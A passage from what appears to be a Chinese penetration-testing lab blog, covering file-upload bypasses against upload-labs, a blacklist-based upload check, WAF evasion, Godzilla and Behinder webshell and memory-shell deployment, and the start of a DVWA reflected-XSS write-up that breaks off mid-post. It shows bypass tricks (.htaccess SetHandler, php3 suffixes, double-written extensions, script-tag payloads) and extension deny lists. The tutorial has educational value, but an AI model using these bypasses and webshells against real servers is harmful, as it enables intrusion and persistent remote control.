invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>设置了黑名单，禁止上传asp、aspx、php、isp文件，并且限制大小写，通过上传非常规后缀名的文件，如php3、php4、phtml，这些文件会被作为php解析，但是需要修改apache配置文件</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508261634679.png"></p><p>随后修改要上传的文件后缀名为php3</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508261636338.png"></p><p>上传成功后，访问该文件</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508261638800.png"></p><h4 id="④pass-4"><a href="#④pass-4" class="headerlink" title="④pass-4"></a>④pass-4</h4><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设置了黑名单，并且几乎所有文件都被进行了限制，可以先上传一个.htaccess文件，这个文件生效于当前目录，并且写入SetHandler application&#x2F;x-httpd-php，这个配置会将该目录下的所有文件都当作php来解析，重启apache</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508261645691.png"></p><p>然后将php文件改后缀为png文件上传</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508261646063.png"></p><p>然后访问该文件</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508261649608.png"></p><p>成功解析！！！</p><h4 id="⑤pass-10"><a href="#⑤pass-10" class="headerlink" title="⑤pass-10"></a>⑤pass-10</h4><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设置了黑名单，并且限制几乎所有文件，但是进行字符过滤的时候，是将匹配到的字符无论大小写都替换为空，所以可以进行双写绕过</p><p>抓包进行上传，将文件名后缀改为pphphp</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508261654240.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508261656772.png"></p><h3 id="2、文件上传防御函数"><a href="#2、文件上传防御函数" class="headerlink" title="2、文件上传防御函数"></a>2、文件上传防御函数</h3><p>编写php代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>); </span><br><span class="line"><span class="comment">// 定义deldot函数，删除文件末尾的点</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deldot</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>)-<span class="number">1</span>;<span class="variable">$i</span>&gt;<span class="number">0</span>;<span class="variable">$i</span>--)&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$s</span>,<span class="variable">$i</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$i</span> == <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>)-<span class="number">1</span> <span class="keyword">and</span> <span class="variable">$c</span> != <span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$s</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$c</span> != <span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$s</span>,<span class="number">0</span>,<span class="variable">$i</span>+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">check</span>(<span class="variable">$test</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$k</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//黑名单策略</span></span><br><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$deny_ext1</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;pHp&quot;</span>,<span class="string">&quot;pHp5&quot;</span>,<span class="string">&quot;pHp4&quot;</span>,<span class="string">&quot;pHp3&quot;</span>,<span class="string">&quot;pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;Html&quot;</span>,<span class="string">&quot;Htm&quot;</span>,<span class="string">&quot;pHtml&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;jSp&quot;</span>,<span class="string">&quot;jSpx&quot;</span>,<span class="string">&quot;jSpa&quot;</span>,<span class="string">&quot;jSw&quot;</span>,<span class="string">&quot;jSv&quot;</span>,<span class="string">&quot;jSpf&quot;</span>,<span class="string">&quot;jHtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;aSp&quot;</span>,<span class="string">&quot;aSpx&quot;</span>,<span class="string">&quot;aSa&quot;</span>,<span class="string">&quot;aSax&quot;</span>,<span class="string">&quot;aScx&quot;</span>,<span class="string">&quot;aShx&quot;</span>,<span class="string">&quot;aSmx&quot;</span>,<span class="string">&quot;cEr&quot;</span>,<span class="string">&quot;sWf&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$k</span>);<span class="comment">//首尾去空</span></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);<span class="comment">//保留文件后缀</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写,防御大小写绕过</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext1</span>,<span class="string">&#x27;forbid&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//防御双写绕过</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>) &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$file_ext</span>,<span class="string">&#x27;forbid&#x27;</span>)==<span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="comment">//文件重命名，防御解析漏洞利用</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;成功上传&quot;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;            </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;禁止上传该后缀文件！！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>测试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell.pHP\shell.jsjspp\shell.pHp.adb.woqoj.dddl</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508261858994.png"></p><p>成功防御大小写</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508261859827.png"></p><p>成功防御双写</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508261902408.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508261903195.png"></p><p>虽然上传成功，但是进行了重命名，并且无法上传.htaccess，shell无法被利用</p><h3 id="3、waf绕过，上传一句话木马"><a href="#3、waf绕过，上传一句话木马" class="headerlink" title="3、waf绕过，上传一句话木马"></a>3、waf绕过，上传一句话木马</h3><p>利用脏数据进行绕过</p><p>使用yakit进行抓包，手动劫持，客户端上传文件</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508261937907.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508261938103.png"></p><p>通过脏数据进行绕过，在form-data后面加，然后发送</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508261940008.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508261942449.png"></p><p>成功绕过waf</p><h3 id="4、哥斯拉管理webshell以及上传内存马"><a href="#4、哥斯拉管理webshell以及上传内存马" class="headerlink" title="4、哥斯拉管理webshell以及上传内存马"></a>4、哥斯拉管理webshell以及上传内存马</h3><h4 id="①在攻击机使用哥斯拉生成木马"><a href="#①在攻击机使用哥斯拉生成木马" class="headerlink" title="①在攻击机使用哥斯拉生成木马"></a>①在攻击机使用哥斯拉生成木马</h4><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508261945839.png"></p><p>选择java，并生成到桌面</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508261957280.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508261959634.png"></p><h4 id="②将shell复制到靶机的www目录下"><a href="#②将shell复制到靶机的www目录下" class="headerlink" title="②将shell复制到靶机的www目录下"></a>②将shell复制到靶机的www目录下</h4><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508262000125.png"></p><h4 id="③哥斯拉连接木马"><a href="#③哥斯拉连接木马" class="headerlink" title="③哥斯拉连接木马"></a>③哥斯拉连接木马</h4><p>添加目标</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508262001589.png"></p><p>url选择上传文件落地的地址，有效载荷选择和木马一样的</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508262003494.png"></p><p>测试连接，成功则进行添加</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508262004744.png"></p><p>进去看看，右键，进入</p><p>里面有相当多的功能</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508262005951.png"></p><p>接着生成内存马，选择memoryshell板块，设置文件名，不要后缀</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508262007194.png"></p><p>生成成功后去进行连接，还是和上传的shell设置一样</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508262010134.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508262011226.png"></p><p>并且内存马是活动在内存，并不会落地到磁盘，除非使用特定的内存管理工具才能看见</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508262012010.png"></p><p>靶机目录没有落地文件</p><h3 id="5、冰蝎webshell管理工具"><a href="#5、冰蝎webshell管理工具" class="headerlink" title="5、冰蝎webshell管理工具"></a>5、冰蝎webshell管理工具</h3><p>生成木马，先点击传输协议，再选择你想用的协议，然后生成服务端，则会生成木马文件</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508262034462.png"></p><p>木马文件默认未shell名字，可以自己更改</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508262035352.png"></p><p>然后将木马文件上传到靶机服务器网站根目录下</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508262036244.png"></p><p>最后进行连接</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508262037723.png"></p><p>然后双击进入</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508262037779.png"></p><p>成功</p><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><h3 id="php语言中命令执行和代码执行的函数"><a href="#php语言中命令执行和代码执行的函数" class="headerlink" title="php语言中命令执行和代码执行的函数"></a>php语言中命令执行和代码执行的函数</h3><h5 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h5><ul><li><p>exec()：命令输出的最后一行，完整输出可存入 $output 数组，需要手动处理输出数组</p></li><li><p>shell_exec()：完整的命令输出字符串</p></li><li><p>system()：命令输出的最后一行，并直接打印结果，直接输出结果，并可获取状态码</p></li><li><p>passthru()：无返回值，直接输出原始命令结果（如二进制数据）</p></li></ul><h5 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h5><ul><li>eval()：执行字符串中的PHP代码，返回NULL或代码中的返回值，可执行任意PHP代码</li><li>assert()：判断断言是否为false，执行字符串代码也可执行字符串代码</li><li>preg_replace()：执行替换后的字符串（当使用&#x2F;e修饰符时）</li><li>create_function()：创建一个匿名函数</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试-xss注入</title>
      <link href="/2025/08/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xss%E6%B3%A8%E5%85%A5/"/>
      <url>/2025/08/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-xss%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="1、反射型xss"><a href="#1、反射型xss" class="headerlink" title="1、反射型xss"></a>1、反射型xss</h3><p>恶意脚本作为请求的一部分（通常藏在URL参数中）发送给服务器，服务器在未经验证的情况下直接将包含恶意脚本的响应返回给用户的浏览器。浏览器执行该脚本。</p><h4 id="①low"><a href="#①low" class="headerlink" title="①low"></a>①low</h4><p>输入payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508251544337.png"></p><p>点击submit</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508251544295.png"></p><p>成功弹窗！！！</p><h4 id="②medium"><a href="#②medium" class="headerlink" title="②medium"></a>②medium</h4><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将匹配到的<script>替换为空</p><p>payload</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//双写</span></span><br><span class="line">&lt;scr&lt;script&gt;ipt&gt;<span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508251550656.png"></p><figure class="highlight 